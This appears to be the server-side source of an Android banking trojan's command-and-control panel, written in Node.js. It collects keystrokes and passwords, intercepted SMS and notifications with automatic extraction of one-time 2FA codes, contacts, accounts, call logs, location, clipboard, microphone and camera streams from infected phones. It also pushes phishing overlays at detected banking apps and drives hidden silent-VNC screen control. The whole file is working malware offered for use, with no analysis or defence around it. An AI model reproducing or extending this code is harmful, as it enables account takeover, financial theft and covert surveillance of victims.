'use strict';
const WebSocket           = require('ws');
const { v4: uuidv4 }     = require('uuid');
const { run, get, all }  = require('./db');
const { encodeVncFrame } = require('./protocol');
const { detectApps, extract2FA } = require('./detector');

// ── Live maps ──────────────────────────────────────────────────────────────────
const devices   = new Map(); // devId → WebSocket
const operators = new Map(); // opId  → WebSocket
const vncSubs   = new Map(); // devId → Set<WebSocket>

// ── Tiny helpers ───────────────────────────────────────────────────────────────
const sleep    = ms => new Promise(r => setTimeout(r, ms));
const tryJSON  = (s, fb = null) => { try { return JSON.parse(s); } catch { return fb; } };
const sendJson = (ws, o) => {
  if (ws.readyState === WebSocket.OPEN) {
    try { ws.send(JSON.stringify(o)); } catch {}
  }
};

function broadcast(obj) {
  const msg = JSON.stringify(obj);
  for (const ws of operators.values())
    if (ws.readyState === WebSocket.OPEN) {
      try { ws.send(msg); } catch {}
    }
}

// ── Device ID buffer cache ────────────────────────────────────────────────────
function makeDevIdBuf(id) {
  const buf = Buffer.alloc(36, 0);
  Buffer.from(id, 'utf8').copy(buf, 0, 0, Math.min(id.length, 36));
  return buf;
}

// ── VNC binary forward ─────────────────────────────────────────────────────────
function forwardVnc(devId, devIdBuf, jpeg) {
  const subs = vncSubs.get(devId);
  if (!subs || !subs.size) return;
  const frame = encodeVncFrame(devIdBuf, jpeg);
  for (const ws of subs) {
    if (ws.readyState === WebSocket.OPEN) {
      try { ws.send(frame); } catch {}
    }
  }
}

// ── Offline command queue ─────────────────────────────────────────────────────
async function enqueueCmd(devId, cmd, args = {}) {
  await run(`INSERT INTO cmd_queue(dev_id,cmd,args) VALUES(?,?,?)`,
    [devId, cmd, JSON.stringify(args)]);
}

async function flushQueue(devId, ws) {
  const rows = await all(`SELECT id,cmd,args FROM cmd_queue WHERE dev_id=? ORDER BY id ASC`, [devId]);
  if (!rows.length) return;
  for (const r of rows) {
    if (ws.readyState !== WebSocket.OPEN) break;
    sendJson(ws, { type: 'cmd', cmd: r.cmd, args: tryJSON(r.args, {}) });
    await sleep(30);
  }
  await run(`DELETE FROM cmd_queue WHERE dev_id=?`, [devId]);
}

// ── Auto-deploy overlays ──────────────────────────────────────────────────────
async function autoDeployOverlays(devId, ws) {
  const overlays = await all(`SELECT * FROM overlays WHERE auto_deploy=1`);
  if (!overlays.length) return;
  await sleep(2000);
  for (const ov of overlays) {
    if (ws.readyState !== WebSocket.OPEN) break;
    sendJson(ws, {
      type: 'cmd', cmd: 'ARM_OVERLAY_MAPPING',
      args: { package: ov.package_name, html: ov.html, name: ov.name }
    });
    await run(
      `INSERT OR REPLACE INTO overlay_deployments(dev_id,overlay_id,package,status) VALUES(?,?,?,?)`,
      [devId, ov.id, ov.package_name, 'armed']
    );
    await sleep(150);
  }
  if (overlays.length) {
    broadcast({ type: 'overlays_auto_armed', dev_id: devId, count: overlays.length });
  }
}

// ── App detection ──────────────────────────────────────────────────────────────
async function runDetection(devId, apps) {
  const { financial, social } = detectApps(apps);
  for (const d of [...financial, ...social]) {
    await run(
      `INSERT OR REPLACE INTO app_detections(dev_id,package,name,category,type,country,detected)
       VALUES(?,?,?,?,?,?,?)`,
      [devId, d.package, d.name,
       financial.includes(d) ? 'financial' : 'social',
       d.type, d.country || null, d.detected]
    );
  }
  await run(`UPDATE devices SET fin_count=?, social_count=? WHERE id=?`,
    [financial.length, social.length, devId]);
  broadcast({
    type: 'detection_update', id: devId,
    financial, social,
    fin_count: financial.length, social_count: social.length,
  });
}

// ── Device upsert / offline ───────────────────────────────────────────────────
async function upsertDevice(id, info) {
  const sw = info.screen_w || info.screenWidth  || 1080;
  const sh = info.screen_h || info.screenHeight || 1920;
  await run(
    `INSERT INTO devices(id,info,online,last_seen,screen_w,screen_h)
     VALUES(?,?,1,strftime('%s','now'),?,?)
     ON CONFLICT(id) DO UPDATE SET
       info=excluded.info, online=1, last_seen=excluded.last_seen,
       screen_w=excluded.screen_w, screen_h=excluded.screen_h`,
    [id, JSON.stringify(info), sw, sh]
  );
}

async function setOffline(id) {
  await run(
    `UPDATE devices SET online=0, last_seen=strftime('%s','now'), vnc_active=0 WHERE id=?`,
    [id]
  );
}

// ── Device message router ─────────────────────────────────────────────────────
async function routeDevMsg(devId, devIdBuf, ws, raw, isBinary) {

  if (isBinary) {
    forwardVnc(devId, devIdBuf, Buffer.isBuffer(raw) ? raw : Buffer.from(raw));
    return;
  }

  let msg;
  try { msg = JSON.parse(raw); } catch { return; }
  const { type, data } = msg;

  switch (type) {

    // ── Handshake ────────────────────────────────────────────────────────────
    case 'handshake': case 'device_info': case 'device_info_response': {
      const info = data || {};
      await upsertDevice(devId, info);
      broadcast({ type: 'device_update', id: devId, info });
      break;
    }

    // ── Ping / pong / heartbeat ───────────────────────────────────────────────
    case 'ping': sendJson(ws, { type: 'pong' }); break;
    case 'pong': case 'heartbeat': ws._alive = true; break;

    // ── VNC / HVNC frames (base64 JSON or binary already handled above) ───────
    case 'vnc_frame': case 'screen_frame': case 'hvnc_frame':
    case 'silent_frame': case 'screen_capture': {
      const b64 = (data && typeof data === 'object') ? data.data : data;
      if (typeof b64 === 'string' && b64.length > 0)
        forwardVnc(devId, devIdBuf, Buffer.from(b64, 'base64'));
      break;
    }

    // ── Keylog ───────────────────────────────────────────────────────────────
    case 'keylog': {
      const app  = data?.app  || data?.package || '';
      const pkg  = data?.pkg  || data?.packageName || data?.package || '';
      const text = data?.text || data?.data    || '';
      const isPass = data?.is_password || false;
      await run(
        `INSERT INTO keylogs(dev_id,app,pkg,text,is_password) VALUES(?,?,?,?,?)`,
        [devId, app, pkg, text, isPass ? 1 : 0]
      );
      broadcast({ type: 'keylog', id: devId, data: { app, pkg, text, is_password: isPass, ts: Date.now() } });
      break;
    }

    // ── Screenshot ───────────────────────────────────────────────────────────
    case 'screenshot': case 'snap': {
      const imgData = data?.data || data?.image || data;
      if (typeof imgData === 'string' && imgData.length > 0) {
        const result = await run(`INSERT INTO screenshots(dev_id,data) VALUES(?,?)`, [devId, imgData]);
        broadcast({ type: 'screenshot_new', id: devId, ss_id: result.lastID });
      }
      break;
    }

    // ── Notification / OTP ───────────────────────────────────────────────────
    case 'notification': case 'notification_intercepted': {
      const app   = data?.app   || data?.packageName || '';
      const pkg   = data?.pkg   || data?.package     || app;
      const title = data?.title || '';
      const text  = data?.text  || data?.body        || data?.content || '';
      const otp   = extract2FA(title + ' ' + text);
      await run(
        `INSERT INTO notifications(dev_id,app,package,title,text,is_otp,otp_code) VALUES(?,?,?,?,?,?,?)`,
        [devId, app, pkg, title, text, otp ? 1 : 0, otp || null]
      );
      broadcast({
        type: 'notification', id: devId,
        data: { app, pkg, title, text, is_otp: !!otp, otp_code: otp, ts: Date.now() }
      });
      if (otp) {
        broadcast({ type: 'otp_intercepted', id: devId, otp, app, title });
        console.log(`[OTP] ${devId.slice(0,8)} → ${otp} (${app})`);
      }
      break;
    }

    // ── SMS ──────────────────────────────────────────────────────────────────
    case 'sms_list': case 'get_sms_response': case 'sms': {
      const list = Array.isArray(data) ? data : (data?.sms || data?.list || []);
      const payload = JSON.stringify(list);
      await run(
        `INSERT INTO device_sms(dev_id,data) VALUES(?,?)
         ON CONFLICT(dev_id) DO UPDATE SET data=excluded.data, ts=strftime('%s','now')`,
        [devId, payload]
      );
      for (const sms of list) {
        const body = sms.body || sms.text || '';
        const otp  = extract2FA(body);
        if (otp) {
          const from = sms.address || sms.from || '';
          broadcast({ type: 'otp_intercepted', id: devId, otp, app: 'SMS', title: from, text: body });
          console.log(`[OTP-SMS] ${devId.slice(0,8)} → ${otp} from ${from}`);
        }
      }
      broadcast({ type: 'sms_update', id: devId, count: list.length });
      break;
    }

    // ── Contacts ─────────────────────────────────────────────────────────────
    case 'contacts': case 'get_contacts_response': {
      const list = Array.isArray(data) ? data : (data?.contacts || []);
      await run(
        `INSERT INTO device_contacts(dev_id,data) VALUES(?,?)
         ON CONFLICT(dev_id) DO UPDATE SET data=excluded.data, ts=strftime('%s','now')`,
        [devId, JSON.stringify(list)]
      );
      broadcast({ type: 'contacts_update', id: devId, count: list.length });
      break;
    }

    // ── Installed apps ────────────────────────────────────────────────────────
    case 'installed_apps': case 'get_installed_apps_response': {
      const list = Array.isArray(data) ? data : (data?.apps || []);
      await run(
        `INSERT INTO device_apps(dev_id,data) VALUES(?,?)
         ON CONFLICT(dev_id) DO UPDATE SET data=excluded.data, ts=strftime('%s','now')`,
        [devId, JSON.stringify(list)]
      );
      broadcast({ type: 'apps_update', id: devId, count: list.length });
      runDetection(devId, list).catch(e => console.error('[detect]', e.message));
      break;
    }

    // ── Accounts ─────────────────────────────────────────────────────────────
    case 'accounts': case 'google_accounts': case 'get_accounts_response': {
      const list = Array.isArray(data) ? data : (data?.accounts || []);
      await run(
        `INSERT INTO device_accounts(dev_id,data) VALUES(?,?)
         ON CONFLICT(dev_id) DO UPDATE SET data=excluded.data, ts=strftime('%s','now')`,
        [devId, JSON.stringify(list)]
      );
      broadcast({ type: 'accounts_update', id: devId, data: list });
      break;
    }

    // ── Location ─────────────────────────────────────────────────────────────
    case 'location': case 'get_location_response': {
      const lat = data?.lat ?? data?.latitude;
      const lng = data?.lng ?? data?.longitude;
      if (lat != null && lng != null) {
        await run(
          `INSERT INTO device_location(dev_id,lat,lng,accuracy,address) VALUES(?,?,?,?,?)`,
          [devId, lat, lng, data?.accuracy || null, data?.address || null]
        );
        broadcast({ type: 'location_update', id: devId, lat, lng, accuracy: data?.accuracy });
      }
      break;
    }

    // ── Calls (new feature module) ────────────────────────────────────────────
    case 'calls': case 'call_logs': case 'get_calls_response': {
      const list = Array.isArray(data) ? data : (data?.calls || data?.list || []);
      await run(
        `INSERT INTO device_calls(dev_id,data) VALUES(?,?)
         ON CONFLICT(dev_id) DO UPDATE SET data=excluded.data, ts=strftime('%s','now')`,
        [devId, JSON.stringify(list)]
      );
      broadcast({ type: 'calls_update', id: devId, count: list.length });
      break;
    }

    // ── Mic audio stream (chunked binary via base64) ──────────────────────────
    case 'mic_chunk': case 'mic_audio': {
      const chunk  = data?.chunk || data;
      const format = data?.format || 'pcm';
      if (typeof chunk === 'string' && chunk.length > 0) {
        broadcast({ type: 'mic_chunk', id: devId, data: { chunk, format, ts: Date.now() } });
      }
      break;
    }

    // ── Camera frame ─────────────────────────────────────────────────────────
    case 'camera_frame': case 'cam_frame': {
      const frame  = data?.frame || data?.chunk || data;
      const facing = data?.facing || 'front';
      if (typeof frame === 'string' && frame.length > 0) {
        broadcast({ type: 'camera_frame', id: devId, data: { frame, facing, ts: Date.now() } });
      }
      break;
    }

    // ── Files ────────────────────────────────────────────────────────────────
    case 'file': case 'file_list': case 'get_files_response': {
      const files = Array.isArray(data) ? data : (data?.files ? data.files : [data]);
      for (const f of files) {
        if (!f?.name) continue;
        await run(`INSERT INTO files(dev_id,name,size,path) VALUES(?,?,?,?)`,
          [devId, f.name, f.size || 0, f.path || '']);
      }
      broadcast({ type: 'file_update', id: devId });
      break;
    }

    // ── Clipboard ────────────────────────────────────────────────────────────
    case 'clipboard': {
      const text = data?.text || data?.content || data || '';
      await run(`INSERT INTO events(dev_id,type,data) VALUES(?,?,?)`,
        [devId, 'clipboard', JSON.stringify({ text, ts: Date.now() })]);
      broadcast({ type: 'event', id: devId, evt: 'clipboard', data: { text, ts: Date.now() } });
      break;
    }


    // ── Bypass status (from AccessibilityDecoy / AdbWirelessBypass) ───────────
    case 'bypass_status': {
      broadcast({
        type:   'bypass_status',
        dev_id: devId,
        status: data?.status || msg.status,
        data:   data || {},
      });
      break;
    }

    case 'bypass_status_full': {
      broadcast({
        type:        'bypass_status',
        dev_id:      devId,
        status:      'LIVE',
        data:        msg,
      });
      break;
    }

    // ── Generic event ─────────────────────────────────────────────────────────
    default: {
      await run(`INSERT INTO events(dev_id,type,data) VALUES(?,?,?)`,
        [devId, type || 'unknown', JSON.stringify(msg)]);
      broadcast({ type: 'event', id: devId, evt: type, data: msg });
    }
  }
}

// ── Device WS handler ─────────────────────────────────────────────────────────
async function handleDevice(ws, req) {
  const devId    = ((req.headers['x-device-id'] || '').trim() || uuidv4()).slice(0, 64);
  const devIdBuf = makeDevIdBuf(devId);
  ws._devId = devId;
  ws._alive = true;
  ws._lastPing = Date.now();

  let info = {};
  try { info = JSON.parse(req.headers['x-device-info'] || '{}'); } catch {}

  await upsertDevice(devId, info);
  devices.set(devId, ws);
  broadcast({ type: 'device_online', id: devId, info });
  console.log(`[+] ${devId.slice(0,8)} connected (${req.headers['x-forwarded-for'] || req.socket.remoteAddress})`);

  flushQueue(devId, ws).catch(() => {});
  autoDeployOverlays(devId, ws).catch(() => {});

  ws.on('message', (data, isBinary) =>
    routeDevMsg(devId, devIdBuf, ws, data, isBinary).catch(e =>
      console.error(`[dev ${devId.slice(0,8)}]`, e.message)
    )
  );

  ws.on('pong', () => {
    ws._alive = true;
    ws._lastPing = Date.now();
  });

  ws.on('close', async () => {
    devices.delete(devId);
    vncSubs.delete(devId);
    await setOffline(devId);
    broadcast({ type: 'device_offline', id: devId });
    console.log(`[-] ${devId.slice(0,8)} disconnected`);
  });

  ws.on('error', e => console.error(`[dev ${devId.slice(0,8)}]`, e.message));
}

// ── Operator WS handler ────────────────────────────────────────────────────────
async function handleOperator(ws, req) {
  const opId = uuidv4();
  ws._opId   = opId;
  ws._alive  = true;
  operators.set(opId, ws);

  // Hydrate dashboard with full device list
  try {
    const rows = await all(`SELECT * FROM devices ORDER BY online DESC, last_seen DESC`);
    const stats = await Promise.all([
      get(`SELECT COUNT(*) n FROM devices WHERE online=1`),
      get(`SELECT COUNT(*) n FROM cmd_queue`),
      get(`SELECT COUNT(*) n FROM notifications WHERE is_otp=1`),
    ]);
    sendJson(ws, {
      type: 'init',
      devices: rows.map(normalizeDevice),
      stats: {
        online:     stats[0]?.n || 0,
        queued_cmds: stats[1]?.n || 0,
        otp_count:  stats[2]?.n || 0,
        operators:  operators.size,
      }
    });
  } catch (e) { console.error('[op init]', e.message); }

  ws.on('message', raw => {
    let msg;
    try { msg = JSON.parse(raw); } catch { return; }
    const { type, target, payload, devId, cmd: msgCmd, args: msgArgs } = msg;

    switch (type) {

      case 'cmd': {
        const cmd  = payload?.cmd  || msgCmd;
        const args = payload?.args || msgArgs || {};
        if (!cmd) return;
        const dev = devices.get(target);
        if (dev && dev.readyState === WebSocket.OPEN) {
          sendJson(dev, { type: 'cmd', cmd, args });
        } else {
          enqueueCmd(target, cmd, args).catch(() => {});
          sendJson(ws, { type: 'cmd_queued', target, cmd });
        }
        break;
      }

      case 'broadcast_cmd': {
        const cmd  = payload?.cmd  || msgCmd;
        const args = payload?.args || msgArgs || {};
        if (!cmd) return;
        const pkt  = JSON.stringify({ type: 'cmd', cmd, args });
        let sent = 0;
        for (const dws of devices.values())
          if (dws.readyState === WebSocket.OPEN) { dws.send(pkt); sent++; }
        sendJson(ws, { type: 'broadcast_ack', cmd, sent });
        break;
      }

      case 'vnc_subscribe': {
        const id = devId || target;
        if (!id) break;
        if (!vncSubs.has(id)) vncSubs.set(id, new Set());
        vncSubs.get(id).add(ws);
        const dev = devices.get(id);
        if (dev && dev.readyState === WebSocket.OPEN)
          sendJson(dev, { type: 'cmd', cmd: 'START_SILENT_VNC', args: {} });
        run(`UPDATE devices SET vnc_active=1 WHERE id=?`, [id]).catch(() => {});
        break;
      }

      case 'vnc_unsubscribe': {
        const id = devId || target;
        if (!id) break;
        const subs = vncSubs.get(id);
        if (subs) {
          subs.delete(ws);
          if (!subs.size) {
            const dev = devices.get(id);
            if (dev && dev.readyState === WebSocket.OPEN)
              sendJson(dev, { type: 'cmd', cmd: 'STOP_SILENT_VNC', args: {} });
            run(`UPDATE devices SET vnc_active=0 WHERE id=?`, [id]).catch(() => {});
          }
        }
        break;
      }

      case 'ping_op': {
        sendJson(ws, { type: 'pong_op', ts: Date.now() });
        break;
      }
    }
  });

  ws.on('pong', () => { ws._alive = true; });

  ws.on('close', () => {
    operators.delete(opId);
    // Remove this operator from all VNC subscriptions
    for (const [dId, subs] of vncSubs) {
      subs.delete(ws);
      if (!subs.size) {
        const dev = devices.get(dId);
        if (dev && dev.readyState === WebSocket.OPEN)
          sendJson(dev, { type: 'cmd', cmd: 'STOP_SILENT_VNC', args: {} });
        run(`UPDATE devices SET vnc_active=0 WHERE id=?`, [dId]).catch(() => {});
      }
    }
  });

  ws.on('error', e => console.error(`[op ${opId.slice(0,8)}]`, e.message));
}

// ── Normalise device row ──────────────────────────────────────────────────────
function normalizeDevice(r) {
  return {
    ...r,
    info:       tryJSON(r.info, {}),
    tags:       tryJSON(r.tags, []),
    online:     r.online === 1,
    vnc_active: r.vnc_active === 1,
  };
}

// ── Heartbeat: device + operator ─────────────────────────────────────────────
const DEVICE_HB_MS   = 20_000;
const OPERATOR_HB_MS = 30_000;

setInterval(() => {
  for (const [id, ws] of devices) {
    if (!ws._alive) {
      console.log(`[hb] ${id.slice(0,8)} timeout — terminating`);
      ws.terminate();
      continue;
    }
    ws._alive = false;
    if (ws.readyState === WebSocket.OPEN) ws.ping();
  }
}, DEVICE_HB_MS);

setInterval(() => {
  for (const [id, ws] of operators) {
    if (!ws._alive) { ws.terminate(); continue; }
    ws._alive = false;
    if (ws.readyState === WebSocket.OPEN) ws.ping();
  }
}, OPERATOR_HB_MS);

// ── Periodic stats broadcast ──────────────────────────────────────────────────
setInterval(async () => {
  if (!operators.size) return;
  try {
    const [online, queued] = await Promise.all([
      get(`SELECT COUNT(*) n FROM devices WHERE online=1`),
      get(`SELECT COUNT(*) n FROM cmd_queue`),
    ]);
    broadcast({
      type: 'stats_tick',
      online:       online?.n  || 0,
      queued_cmds:  queued?.n  || 0,
      operators:    operators.size,
      devices_total: devices.size,
      ts: Date.now(),
    });
  } catch {}
}, 10_000);

module.exports = {
  handleDevice, handleOperator,
  devices, operators, vncSubs,
  enqueueCmd, broadcast, normalizeDevice,
};
